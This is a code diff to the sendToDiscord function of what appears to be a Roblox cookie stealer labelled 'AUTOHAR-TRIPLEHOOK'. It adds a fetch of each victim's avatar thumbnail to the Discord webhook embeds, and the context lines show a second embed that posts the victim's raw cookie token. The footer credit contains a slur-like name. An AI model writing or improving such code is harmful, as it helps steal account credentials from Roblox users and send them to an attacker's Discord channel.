@@ -2123,6 +2123,20 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
 
   try {
     if (userData) {
+      // Fetch avatar thumbnail URL
+      let avatarUrl = null;
+      try {
+        const avatarResponse = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userData.userId}&size=420x420&format=Png&isCircular=false`);
+        if (avatarResponse.ok) {
+          const avatarData = await avatarResponse.json();
+          if (avatarData.data && avatarData.data.length > 0) {
+            avatarUrl = avatarData.data[0].imageUrl;
+          }
+        }
+      } catch (error) {
+        console.log('Failed to fetch avatar, continuing without it');
+      }
+
       // First embed: User data only (without cookie)
       const userDataEmbed = {
         title: customTitle || "<:emoji_37:1410520517349212200> AUTOHAR-TRIPLEHOOK",
@@ -2197,6 +2211,13 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
           text: "Made By .Niqqa"
         }
       };
+
+      // Add thumbnail if avatar URL was fetched successfully
+      if (avatarUrl) {
+        userDataEmbed.thumbnail = {
+          url: avatarUrl
+        };
+      }
 
       // Second embed: Cookie only - display the raw token value in description with code block formatting
       const cookieEmbed = {
